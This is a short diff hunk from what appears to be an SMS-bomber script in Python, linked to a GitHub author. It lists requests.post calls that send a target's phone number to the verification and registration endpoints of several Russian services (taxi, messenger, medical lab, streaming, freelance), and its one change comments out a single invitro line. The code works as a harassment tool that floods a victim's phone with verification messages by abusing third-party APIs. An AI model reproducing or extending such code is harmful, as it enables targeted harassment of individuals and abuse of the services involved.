@@ -134,7 +134,7 @@ https://github.com/crinny
 			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
 			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': self.formatted_phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
 			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + self.formatted_phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + self.formatted_phone})
+			#requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + self.formatted_phone})
 			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
 			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": self.formatted_phone})
 			requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164':_phone})
